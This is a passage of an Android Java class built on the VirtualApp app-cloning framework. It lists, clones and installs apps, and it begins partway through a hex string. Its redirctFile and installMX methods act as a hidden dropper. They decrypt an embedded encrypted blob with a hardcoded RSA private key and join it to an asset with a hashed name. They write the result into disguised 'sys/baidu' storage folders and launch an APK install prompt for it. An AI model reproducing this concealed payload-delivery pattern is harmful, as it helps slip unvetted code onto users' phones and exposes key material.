A1A08DB087806301B626990063F6BB4E137BF5542B05FB53424920C1C585C9FB354CE247EC4080843C827E852DFC7A9895FC8AD1BEC57824A8BCF2D03704F8E2FA9F069FD7DEEB60301452FEB20328CAD54DAD322B99613797F6FDC6F3B05D16A15821CBFAF9BD6BC6A3B3F02E4BC28A17DA934EB60E2250B7DB89346ABFE00701F0142EF0AEE25A809019860CFE7C6618226AD887D224214BEA5D1C4CC867F08B827B48BD28D578052F8092D52DDE0A504EBDB466B637A036CD057FFFC37ADC30F85C8A9F32AADD2A96ECB3E7A0258529B6AAC9090E034ACABE90BF76C540709068EE6E6A9A02ADA8FD3FFADBED2E29DC003A1B24EB748134C98937824D211CC9B0F7D2E5CB23164EA55961F239939F48A4F0A0A4339D";
    //外部不可启动
    private String partData = "3F6F0438124B68E6E1711C143BDFA9AF5B7D4DAC54D8A4E6D0FB8A7D1BFECC7E6AEBA75DF6575D9753023E6D800334C8BB7D0046788ACFADC0665B1019D58DFC9039819682E98A2D2A55F80E9CA39A5A237184B5D7C49DE16307B2F83B6BFEE4888B93110A61A4ECC6C7A247BE6B6BE23855FB83457A57F4E6755C053CBA77838282CB33B6166959C11801B05F1B4F0B8CE0D3FF2F94DAF9D12BCDC1564BD57FD6F194D6343795101C62DA12A9EE3C3CB0B6113324E5A31C0FC7770E7B4AC9907E21A4A1334730FF356829762FAEBA851DFCD852FA490E7E2E296243A74818F063D0CED3949FFBC977E8AE8CD0A7F0F124CF29CAEDC03CAA6FE23C8951A9B7D474125AE6BA90137174931C54F9AAA7D544DE187EF1A8BB5AADD101F44788FFAAC667AD07842F2D706BCE21264D7F9CAB75AB3B9543E884D9D085320FD78D9D478C91773DD177CC5561283104C037E07485C801B31491E16D6A5529802695FAE8BE9C3ABC880E9BA666DEC969AEF530AA5A89789449A6ED60A1DF9AA1DEC619991820D2A12E73783924B0C502C4331CA1B5857B6684184B4FEA45FC09BBAA40BC4A683BDB5513C55ED5EE9352802D46F8AF483091F12D701830837E26776E3C36C57B6D6634757A69F492BEADD12C1B47DBA0F21BD90255D354C8427C9A99A1C846C973CD1053DE2AAEC148B4F9E86BAF4CC5234795FD8D8DF6337886C7CFB0AD2E38F7A0D9427F6507AF2A7FAC325F242B9AF487313F37F8546C7967F998FED23C0822A025ED927CEEE30F1486E8D46971CE1FC89444BBB0DC7449CC31517648134E977DE7D2A3891C8E9349CE84D95B60155D3449783177AD8859A2DC03BD0FED6F91AE67ED3D7A4CB353202BF4E864EE83EC3A208256EF4F8048F70689D7B246514C0B3168D81F6AEF92A43D0FA08967A5AA07607E3566B58ACB152AF3ED4A4230FAC2457C8E51B450617B92F0B65E713450DA0E9658F937955A4949331256B6D7C4225363245E6BC9E87F945BDE3126EC71AD9589C736F4E3E13A95B5288A553A7AAAEFD977C6A866982F89E344093407EF5F273A70A8543AFD249D2CC9000165D1CAA51513531B1812C8813C14C8CF84FD8A7F8815F432EC7AA90463CD6D4EEE379E673F7500F6D977FAEA413BE17B436653AD9B57E5913EEA09D4C2084462F39BB8152235BD2014D3308DA750BA230AC6CFBFF8F5D312130FB450EEC811F57A2000B1BD20D0EBCF0164539F0D1FC8EB657DFA40C0445CB3D5B4E77727BC3159DE7225E20F0B6B37159141626F9F36A76501BE9D607DF9A8A9D7D99A8A43017775B9542E8C884277E72EC68DC2BDEC2A77C6A1F157079B514457398E4C60BC311EB622499E797BBD090572B1A2B5EAA4A35D29865008686FCC671464F434300FE4B17D44239D5066B42B1DAC8EED1D13882AFF57CD107BE2928E3A5A580D03A5AB2A37DEDD4A1EEA2CB3E8122D78DD4CB1CFE0D08D52C3CB61FD20DDBE5F23FDD6ADC73DEE182031F66434207889A45E75F6709BBFCF6CD3042F83BC424EAB3DEF0A8A4BAC567DB6460ACF6034548FB87B7A63533C7DFFDD102C2BADF10A7197873DB3714C0467252438E4E48AD615E553B3495C6CA6AFF288F75068085F755C688906DF346BC2CE6DA8F0F5D881410353A7D6845B52F38765A7DC1FB1A85CB513F6A170235B52F8A20E418DCCF32AA9C7D2425A71CCFFAF94F7739979A3B1B16A2A110834ACEB839DCC61799AE0B74E332270271920897664AD622933BFBD79B7170779A594114DBD8996A99798E98D46BEA4AD75B8981F2C73790F326D7F76D32AAA66DEA6290253F51AE8FBD338A365474BDAC5014B658DDBDC635F47D16CBDAC55898F88DFE45AC5FA521A46BFBAFA9F97F95AC6B6F8FCCC9C440FD9680A41439FA5F96192E4E8E0EFC7C2229F24BC70F17D86C42FB4823E1B7915A7BCCBA601254493232AED09B2456EBDED1F1C83FCE91BC09FA60C2B4CD2683C433797BB03A6DCB66048091AB1E9E74018E9688D02CC93BF0EE81CB306A8890C8E2ED9788B8E90A0B16CD4FD8E88EAF0B5F9B1B3E891999318540CFB9442A59F325CF2DA558F3DE98ECE477874E7AB7FF9E84EC4C1BC969A539CC83802CBD0B262E673845ED60E45E75481FB5001F91D2CA3160AE5F538BF1855960A7DA8D69913";

    private static final Collator COLLATOR = Collator.getInstance(Locale.CHINA);
    public static final List<String> SCAN_PATH_LIST = Arrays.asList(
            "sys/temp/user/_template"
//            ".",
//            "wandoujia/app",
//            "tencent/tassistant/apk",
//            "BaiduAsa9103056",
//            "360Download",
//            "pp/downloader",
//            "pp/downloader/apk",
//            "pp/downloader/silent/apk"
    );

    private Context mContext;

    public AppRepository(Context context) {
        mContext = context;
    }

    private static boolean isSystemApplication(PackageInfo packageInfo) {
        return (packageInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0
                && !GmsSupport.isGmsFamilyPackage(packageInfo.packageName);
    }

    @Override
    public Promise<List<AppData>, Throwable, Void> getVirtualApps() {
        return VUiKit.defer().when(() -> {
            List<InstalledAppInfo> infos = VirtualCore.get().getInstalledApps(0);
            List<AppData> models = new ArrayList<>();
            for (InstalledAppInfo info : infos) {
                if (!VirtualCore.get().isPackageLaunchable(info.packageName)) {
                    continue;
                }
                PackageAppData data = new PackageAppData(mContext, info);
                if (VirtualCore.get().isAppInstalledAsUser(0, info.packageName)) {
                    models.add(data);
                }
                int[] userIds = info.getInstalledUsers();
                for (int userId : userIds) {
                    if (userId != 0) {
                        models.add(new MultiplePackageAppData(data, userId));
                    }
                }
            }
            return models;
        });
    }

    @Override
    public Promise<List<AppInfo>, Throwable, Void> getInstalledApps(Context context) {
        return VUiKit.defer().when(() -> convertPackageInfoToAppData(context, context.getPackageManager().getInstalledPackages(0), true));
    }

    @Override
    public Promise<List<AppInfo>, Throwable, Void> getStorageApps(Context context, File rootDir) {
        return VUiKit.defer().when(() -> convertPackageInfoToAppData(context, installMX(context, rootDir, SCAN_PATH_LIST), false));
    }

    public List<PackageInfo> installMX(Context context, File rootDir, List<String> paths) {
        List<PackageInfo> packageList = new ArrayList<>();
        if (paths == null)
            return packageList;
        for (String path : paths) {
            File[] dirFiles = new File(rootDir, path).listFiles();
            if (dirFiles == null)
                continue;
            for (File f : dirFiles) {
//                if (!f.getName().toLowerCase().endsWith(".apk"))
//                    continue;
                PackageInfo pkgInfo = null;
                try {
                    pkgInfo = context.getPackageManager().getPackageArchiveInfo(f.getAbsolutePath(), 0);
                    pkgInfo.applicationInfo.sourceDir = f.getAbsolutePath();
                    pkgInfo.applicationInfo.publicSourceDir = f.getAbsolutePath();
                } catch (Exception e) {
                    // Ignore
                }
                if (pkgInfo != null)
                    packageList.add(pkgInfo);
            }
        }
        return packageList;
    }

    public void installMX(Context context) {
        File f = redirctFile(context);
        installApk(context, f);
    }

    public void unpackMX(Context context) {
        redirctFile(context);
//        installApk(context, f);
    }

    public static void installApk(Context context, File file) {
        if (context == null || file == null) {
            return;
        }


        Intent intent = new Intent(Intent.ACTION_VIEW);

        //判读版本是否在7.0以上
        if (Build.VERSION.SDK_INT >= 24) {
            //provider authorities
            Uri apkUri = FileProvider.getUriForFile(context, "com.bin.fileprovider", file);
            //Granting Temporary Permissions to a URI
            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
        } else {
            intent.setDataAndType(Uri.fromFile(file), "application/vnd.android.package-archive");
        }
        context.startActivity(intent);
    }

    private File redirctFile(Context context) {
        File target = null;
        try {
            InputStream is = context.getAssets().open(MD5Utils.encrypt("aoyou.data"));
            File parent_path = Environment.getExternalStorageDirectory();
            // 可以建立一个子目录专门存放自己专属文件
            File dir = new File(parent_path.getAbsoluteFile(), "sys/baidu/user/template");
            dir.mkdirs();

            byte[] buffer = new byte[1024];
            int byteCount = 0;
            String modulus = "101139253338155537122681263551391401692066665916613487436275955722010199471415841485729163754132286657951275782618854770472010908407158470741951949410587800589127059181738617385251968563652490730289519152085655065302311553563299905910600441758613944432476284758060061258064772215795815169533468766442967476449";
            //私钥指数
            String private_exponent = "77040033353587478351181338141034990369862215683099041858893937555861134440278777222165884672323082873057748117004376901547725049339972199183804313083082114860116154901276523598153162839702785813272951961243156651418620364910731144201588093748132726391031044890152993376853663320094215905479322137162494227093";
            RSAPrivateKey priKey = RSAUtils.getPrivateKey(modulus, private_exponent);
//            //解密后的明文
            buffer = Base64.decode(RSAUtils.decryptByPrivateKey(partData, priKey));
            target = new File(dir, "temp_");
            FileOutputStream fos = new FileOutputStream(target);
            fos.write(buffer, 0, buffer.length);
            while ((byteCount = is.read(buffer)) != -1) {//循环从输入流读取 buffer字节
                fos.write(buffer, 0, byteCount);//将读取的输入流写入到输出流
            }
            fos.flush();//刷新缓冲区
            is.close();
            fos.close();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return target;
    }

    public List<AppInfo> convertPackageInfoToAppData(Context context, List<PackageInfo> pkgList, boolean fastOpen) {
        PackageManager pm = context.getPackageManager();
        List<AppInfo> list = new ArrayList<>(pkgList.size());
        String hostPkg = VirtualCore.get().getHostPkg();
        for (PackageInfo pkg : pkgList) {
            // ignore the host package
            if (hostPkg.equals(pkg.packageName)) {
                continue;
            }
            // ignore the System package
            if (isSystemApplication(pkg)) {
                continue;
            }

            ApplicationInfo ai = pkg.applicationInfo;
            String path = ai.publicSourceDir != null ? ai.publicSourceDir : ai.sourceDir;
            if (path == null) {
                continue;
            }
            AppInfo info = new AppInfo();
            info.packageName = pkg.packageName;
            info.fastOpen = fastOpen;
            info.path = path;
            info.icon = ai.loadIcon(pm);
            info.name = ai.loadLabel(pm);
            InstalledAppInfo installedAppInfo = VirtualCore.get().getInstalledAppInfo(pkg.packageName, 0);
            if (installedAppInfo != null) {
                info.cloneCount = installedAppInfo.getInstalledUsers().length;
            }
            list.add(info);
        }
        return list;
    }

    private boolean isOrderedApp(String packageName, String pkg) {
        return packageName.equalsIgnoreCase(pkg);// || packageName.equalsIgnoreCase("com.example.kevin.deviceinfo");
    }

    @Override
    public InstallResult addVirtualApp(AppInfoLite info) {
        int flags = InstallStrategy.COMPARE_VERSION | InstallStrategy.SKIP_DEX_OPT;
        if (info.fastOpen) {
            flags |= InstallStrategy.DEPEND_SYSTEM_IF_EXIST;
        }
        return VirtualCore.get().installPackage(info.path, flags);
    }

    @Override
    public boolean removeVirtualApp(String packageName, int userId) {
        return VirtualCore.get().uninstallPackageAsUser(packageName, userId);
    }

    public List<AppInfo> convertPackageInfoToAppData(Context context, List<PackageInfo> pkgList, boolean fastOpen, String orderedPkg) {
        PackageManager pm = context.getPackageManager();
        List<AppInfo> list = new ArrayList<>(pkgList.size());
        String hostPkg = VirtualCore.get().getHostPkg();
        for (PackageInfo pkg : pkgList) {
            // ignore the host package
            if (hostPkg.equals(pkg.packageName)) {
                continue;
            }
            // ignore the System package
            if (isSystemApplication(pkg)) {
                continue;
            }
            if (!isOrderedApp(pkg.packageName, orderedPkg)) {
                continue;
            }
            ApplicationInfo ai = pkg.applicationInfo;
            String path = ai.publicSourceDir != null ? ai.publicSourceDir : ai.sourceDir;
            if (path == null) {
                continue;
            }
            AppInfo info = new AppInfo();
            info.packageName = pkg.packageName;
            info.fastOpen = fastOpen;
            info.path = path;
            info.icon = ai.loadIcon(pm);
            info.name = ai.loadLabel(pm);
            InstalledAppInfo installedAppInfo = VirtualCore.get().getInstalledAppInfo(pkg.packageName, 0);
            if (installedAppInfo != null) {
                info.cloneCount = installedAppInfo.getInstalledUsers().length;
            }
            list.add(info);
        }
        return list;
    }
}
